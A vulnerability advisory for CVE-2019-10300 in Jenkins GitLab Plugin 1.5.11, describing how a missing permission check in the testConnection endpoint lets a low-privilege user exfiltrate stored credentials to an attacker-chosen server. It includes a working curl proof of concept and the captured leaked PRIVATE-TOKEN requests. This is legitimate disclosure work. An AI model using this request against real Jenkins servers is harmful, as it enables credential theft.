## Jenkins GitLab Plugin - Information disclosure vulnerability

##### Discovered by:
* Peter Adkins <peter.adkins@kernelpicnic.net>

##### Access:
* Local network; authenticated access
* Remote network; authenticated access (See notes)
* Remote network; 'drive-by' via CSRF

##### Tracking and identifiers:
* CVE - CVE-2019-10300

##### Versions Affected:
* Jenkins GitLab Plugin 1.5.11

##### Vendor involvement:
* 2019-03-12 - Vendor Disclosure
* 2019-04-30 - Vendor Patched
* 2019-05-06 - Public Release

##### Notes:
1. This may be exploited by an anonymous user if unauthenticated access is enabled in Jenkins.

1. Due to lack of validation of Cross Site Request Forgery (CSRF) token validation, this vulnerability may also be exploited via CSRF.

1. Originally published under [TALOS-2019-0788](https://talosintelligence.com/vulnerability_reports/TALOS-2019-0788). Mirrored here here for tracking purposes.

##### Overview:
An exploitable information disclosure vulnerability exists in the `testConnection` functionality of the Jenkins GitLab Plugin 1.5.11. A specially crafted HTTP request from a user with Overall/Read permissions - such as an anonymous user, if enabled - can cause affected versions of this plugin to disclose credentials from the Jenkins credentials database to an attacker controlled server.

In order for this attack to be successful, the attacker will need to know the credentials id of the credentials to disclose. This can be found through a number of ways, such as exposed build logs (read), access to the credential manager in the Jenkins UI (read), or through another vulnerable plugin which provides a `fillCredentialsIdItems` style endpoint.

##### Analysis:
This vulnerability exists in the `testConnection` endpoint exposed by the `doTestConnection` method of `com.dabsquared.gitlabjenkins.connection.GitLabConnectionConfig` due to missing Jenkins permissions check.

Due to the way in which this plugin expects to authenticate against the remote GitLab instance, the credentials associated with the attacker-specified `credentialsId` are submitted as part of the HTTP `PRIVATE-TOKEN` header to the attacker-controlled server. An example of this attack against a Jenkins 2.165 instance running a vulnerable version of this plugin and configured to allow anonymous read access has been provided below.

```
# Send credentials to an attacker's server (http://127.0.0.1:7000?).
# The trailing '?' is to ensure that the expected path is appended as a
# query parameter, rather than part of the query path.
$ curl -s -X GET -G \
    -d 'url=http://127.0.0.1:7000/?' \
    -d 'clientBuilderId=autodetect' \
    -d 'apiTokenId=532ba431-e25d-4aad-bc74-fb5b2cc03bd7' \
    'http://127.0.0.1:8080/jenkins/descriptorByName/com.dabsquared.gitlabjenkins.connection.GitLabConnectionConfig/testConnection'
```

The request submitted by the plugin to the remote server as an HTTP GET, will appear similar to the following (multiple requests are submitted to the attacker specified server when the `clientBuilderdId` field above is set to `autodetect`):

```
# First request from Jenkins (GET).
/api/v4/user
Accept: application/json
PRIVATE-TOKEN: ASecretTextEntry
Host: 127.0.0.1:7000
Connection: Keep-Alive

# Second request from Jenkins (GET)
/api/v3/user
Accept: application/json
PRIVATE-TOKEN: ASecretTextEntry
Host: 127.0.0.1:7000
Connection: Keep-Alive
```

It is worth noting that as the response from the attacker-specified server is not in the expected format the plugin will raise an error but not render the response.
